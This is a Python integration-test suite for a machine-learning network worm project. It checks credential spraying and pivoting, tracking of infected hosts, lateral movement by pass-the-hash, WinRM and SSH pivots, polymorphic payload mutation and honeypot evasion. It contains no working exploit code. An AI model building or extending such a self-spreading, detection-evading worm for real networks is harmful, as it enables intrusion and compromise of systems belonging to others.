"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Integration Tests - End-to-end workflow tests
Tests complete worm propagation flow with mocked components
"""


import os
import sys
import unittest
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestWormCoreIntegration(unittest.TestCase):
    """Test complete worm core integration"""

    @patch("configs.config.Config")
    def test_worm_core_initialization(self, mock_config):
        """Test worm core initializes all components"""
        mock_config_instance = MagicMock()
        mock_config_instance.validate.return_value = True
        mock_config_instance.network.target_ranges = ["127.0.0.1/32"]
        mock_config_instance.network.ports_to_scan = [22, 80]
        mock_config_instance.evasion.stealth_mode = False
        mock_config_instance.evasion.detect_ids = False
        mock_config_instance.ml.use_pretrained = False
        mock_config_instance.ml.online_learning = False
        mock_config_instance.ml.rl_agent_path = "saved/rl_agent.h5"
        mock_config_instance.propagation.max_infections = 10
        mock_config_instance.propagation.propagation_delay = 0
        mock_config_instance.safety.max_runtime_hours = 1
        mock_config_instance.safety.auto_destruct_time = 0
        mock_config_instance.safety.geofence_enabled = False
        mock_config_instance.safety.kill_switch_code = "TEST"
        mock_config_instance.safety.allowed_networks = ["127.0.0.1/8"]
        mock_config.return_value = mock_config_instance

        try:
            from worm_core import WormCore

            worm = WormCore(use_cli_monitor=False)
            self.assertIsNotNone(worm)
            self.assertIsNotNone(worm.scanner)
            self.assertIsNotNone(worm.exploit_manager)
            self.assertIsNotNone(worm.rl_agent)
            self.assertIsNotNone(worm.real_world_agent)
        except Exception as e:
            self.skipTest(f"WormCore init failed: {e}")

    def test_credential_manager_integration(self):
        """Test credential manager loads and ranks credentials"""
        try:
            from exploits.credential_manager import CredentialManager

            cm = CredentialManager(wordlist_dir="wordlists")

            # Should have loaded credentials
            self.assertGreater(cm.stats["total_loaded"], 0)

            # Should return ranked credentials for SSH
            ssh_creds = cm.get_credentials_for_service("ssh", limit=5)
            self.assertGreater(len(ssh_creds), 0)
            self.assertLessEqual(len(ssh_creds), 5)

            # Should support pivoting
            cm.add_discovered_credential("admin", "P@ssw0rd")
            discovered = cm.get_discovered_credentials()
            self.assertGreater(len(discovered), 0)

            # Should support spraying
            spray_pwds = cm.get_spray_passwords(limit=10)
            self.assertGreater(len(spray_pwds), 0)

        except ImportError:
            self.skipTest("CredentialManager not available")

    def test_knowledge_graph_integration(self):
        """Test knowledge graph tracks hosts and finds paths"""
        try:
            from core.knowledge_graph import NetworkKnowledgeGraph

            kg = NetworkKnowledgeGraph()

            # Add hosts
            kg.add_host("192.168.1.1", os_guess="Linux", ports=[22, 80], is_infected=True)
            kg.add_host("192.168.1.2", os_guess="Windows", ports=[445, 3389])
            kg.add_host("192.168.1.3", os_guess="Linux", ports=[22, 3306])

            # Add services
            kg.add_service("192.168.1.1", 22, "SSH")
            kg.add_service("192.168.1.2", 445, "SMB")

            # Add credentials
            kg.add_credential("192.168.1.1", "root", "password", source="test")

            # Add reachability
            kg.add_reachability("192.168.1.1", "192.168.1.2")
            kg.add_reachability("192.168.1.2", "192.168.1.3")

            # Query
            infected = kg.get_infected_hosts()
            self.assertIn("192.168.1.1", infected)

            uninfected = kg.get_uninfected_hosts()
            self.assertIn("192.168.1.2", uninfected)

            # Path finding
            path = kg.find_propagation_path("192.168.1.1", "192.168.1.3")
            self.assertIsNotNone(path)
            self.assertEqual(path[0], "192.168.1.1")
            self.assertEqual(path[-1], "192.168.1.3")

            # Summary
            summary = kg.get_network_summary()
            self.assertEqual(summary["total_hosts"], 3)
            self.assertEqual(summary["infected_hosts"], 1)

        except ImportError:
            self.skipTest("KnowledgeGraph not available")

    def test_lateral_movement_integration(self):
        """Test lateral movement engine technique selection"""
        try:
            from post_exploit.lateral_movement import LateralMovementEngine

            engine = LateralMovementEngine()

            # SSH with password
            tech = engine._select_best_technique(
                [22], "Linux", {"username": "root", "password": "toor"}
            )
            self.assertEqual(tech, "ssh_pivot")

            # Pass-the-hash
            tech = engine._select_best_technique(
                [445], "Windows", {"username": "admin", "hash": "abc"}
            )
            self.assertEqual(tech, "pass_the_hash")

            # WinRM
            tech = engine._select_best_technique(
                [5985], "Windows", {"username": "admin", "password": "pass"}
            )
            self.assertEqual(tech, "winrm")

            # SSH key pivot
            tech = engine._select_best_technique(
                [22], "Linux", {"username": "root", "ssh_key": "/path/to/key"}
            )
            self.assertEqual(tech, "ssh_key_pivot")

            # BFS path finding
            graph = {
                "192.168.1.1": ["192.168.1.2", "192.168.1.3"],
                "192.168.1.2": ["192.168.1.4"],
                "192.168.1.3": ["192.168.1.5"],
            }
            path = engine.get_optimal_path("192.168.1.1", "192.168.1.4", graph)
            self.assertEqual(path, ["192.168.1.1", "192.168.1.2", "192.168.1.4"])

        except ImportError:
            self.skipTest("LateralMovementEngine not available")

    def test_polymorphic_engine_integration(self):
        """Test polymorphic engine mutation"""
        try:
            from evasion.polymorphic_engine import PolymorphicEngine

            engine = PolymorphicEngine(mutation_level=2)

            # Payload mutation
            payload = 'x = "hello"; y = "world"; print(x + y)'
            mutated = engine.mutate_payload(payload)
            self.assertNotEqual(mutated, payload)

            # Network signature mutation
            sig = engine.mutate_network_signature()
            self.assertIn("user_agent", sig)
            self.assertIn("jitter", sig)
            self.assertIn("ttl", sig)

            # Timing delay
            delay = engine.get_timing_delay(1.0)
            self.assertGreater(delay, 0)

        except ImportError:
            self.skipTest("PolymorphicEngine not available")

    def test_async_scanner_integration(self):
        """Test async scanner target expansion"""
        try:
            from scanner.async_scanner import AsyncScanner

            scanner = AsyncScanner()

            # Expand CIDR
            ips = scanner._expand_targets(["192.168.1.0/30"])
            self.assertEqual(len(ips), 2)

            # Vulnerability scoring
            score = AsyncScanner._calculate_vuln_score([445, 3389, 22], {}, {})
            self.assertGreater(score, 0)
            self.assertLessEqual(score, 100)

        except ImportError:
            self.skipTest("AsyncScanner not available")

    def test_rate_limiter_integration(self):
        """Test smart rate limiter"""
        try:
            from utils.rate_limiter import SmartRateLimiter

            limiter = SmartRateLimiter(
                global_max_rate=100,
                host_max_rate=10,
                backoff_base=1.0,
                backoff_max=60.0,
            )

            # Should allow normal requests
            allowed, delay = limiter.should_proceed("192.168.1.1")
            self.assertTrue(allowed)
            self.assertEqual(delay, 0.0)

            # Record success
            limiter.record_success("192.168.1.1", 0.1)

            # Record failures trigger backoff
            for i in range(5):
                limiter.record_failure("192.168.1.2")

            allowed, delay = limiter.should_proceed("192.168.1.2")
            self.assertFalse(allowed)
            self.assertGreater(delay, 0)

            # Stats
            stats = limiter.get_host_stats("192.168.1.1")
            self.assertIn("requests_last_second", stats)
            self.assertIn("failures", stats)

        except ImportError:
            self.skipTest("SmartRateLimiter not available")

    def test_validators_integration(self):
        """Test input validation"""
        try:
            from utils.validators import (
                expand_target_ranges,
                validate_cidr,
                validate_ip,
                validate_port,
                validate_target_ranges,
            )

            # IP validation
            self.assertTrue(validate_ip("192.168.1.1"))
            self.assertFalse(validate_ip("999.999.999.999"))
            self.assertFalse(validate_ip("not_an_ip"))

            # CIDR validation
            self.assertTrue(validate_cidr("192.168.1.0/24"))
            self.assertFalse(validate_cidr("invalid"))

            # Port validation
            self.assertTrue(validate_port(80))
            self.assertTrue(validate_port(443))
            self.assertFalse(validate_port(0))
            self.assertFalse(validate_port(70000))

            # Target range validation
            valid, invalid = validate_target_ranges(["192.168.1.0/24", "invalid"])
            self.assertEqual(len(valid), 1)
            self.assertEqual(len(invalid), 1)

            # Target expansion with limit
            ips = expand_target_ranges(["192.168.1.0/30"], max_hosts=10)
            self.assertEqual(len(ips), 2)

        except ImportError:
            self.skipTest("Validators not available")

    def test_honeypot_detection_integration(self):
        """Test honeypot detection with multiple indicators"""
        try:
            from configs.config import Config
            from evasion.ids_detector import IDSDetector

            config = Config()
            detector = IDSDetector(config)

            # Normal host - should not be flagged
            normal_host = {
                "open_ports": [22, 80, 443],
                "banners": {22: "SSH-2.0-OpenSSH_8.9", 80: "Apache/2.4"},
                "hostname": "webserver01",
            }
            is_honeypot, confidence = detector.is_honeypot("192.168.1.10", normal_host)
            self.assertFalse(is_honeypot)

            # Honeypot-like host - many ports + suspicious hostname
            honeypot_host = {
                "open_ports": list(range(20, 100)),  # 80 ports
                "banners": {},
                "hostname": "honeypot-test",
            }
            is_honeypot, confidence = detector.is_honeypot("192.168.1.99", honeypot_host)
            self.assertTrue(is_honeypot)
            self.assertGreater(confidence, 0.5)

        except ImportError:
            self.skipTest("IDSDetector not available")

    def test_config_profiles(self):
        """Test configuration profile application"""
        try:
            from worm_core import CONFIG_PROFILES

            self.assertIn("stealth", CONFIG_PROFILES)
            self.assertIn("aggressive", CONFIG_PROFILES)
            self.assertIn("audit", CONFIG_PROFILES)

            # Stealth should be slower than aggressive
            self.assertGreater(
                CONFIG_PROFILES["stealth"]["propagation_delay"],
                CONFIG_PROFILES["aggressive"]["propagation_delay"],
            )

            # Stealth should have fewer max infections
            self.assertLess(
                CONFIG_PROFILES["stealth"]["max_infections"],
                CONFIG_PROFILES["aggressive"]["max_infections"],
            )

        except ImportError:
            self.skipTest("WormCore not available")


if __name__ == "__main__":
    unittest.main(verbosity=2)
